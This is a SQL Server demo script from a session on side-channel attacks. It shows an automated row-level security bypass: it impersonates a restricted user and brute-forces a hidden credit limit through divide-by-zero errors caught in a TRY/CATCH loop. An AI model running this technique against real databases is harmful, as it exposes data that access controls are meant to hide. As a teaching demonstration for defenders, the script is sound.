/*******************************************************************
*	Session:	Side Channel Attacks in SQL Server
*	Author:		Ben Johnston
*	Name:		Demo03.RLS.03.SideChannel.Automated.sql
*	Notes:		RLS Side channel attack with known ID	
*				Converts column to int to reduce attack space
*				Inserts to table to reduce screen output 
********************************************************************/
USE WWISideChannel
SET NOCOUNT ON
SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED
GO

EXECUTE AS USER = 'SideChannelUser'
GO

DECLARE @CreditLimit int = 0

DECLARE @Customers TABLE (
	CustomerID		int		PRIMARY KEY CLUSTERED
	,CreditLimit	int
)

WHILE @CreditLimit < 10000
BEGIN

	BEGIN TRY
		INSERT INTO @Customers (
			CustomerID
			,CreditLimit
		)
		SELECT CustomerID, CreditLimit
		FROM Sales.Customers
		WHERE CustomerID = 801		--Known ID used for demonstration purposes.
			AND TRY_CONVERT(int,1/(CreditLimit - @CreditLimit)) = 0
	END TRY
	BEGIN CATCH
		--Same value as the previous example should be shown here
		PRINT @CreditLimit
	END CATCH

	SELECT @CreditLimit += 1

END
GO

REVERT
GO
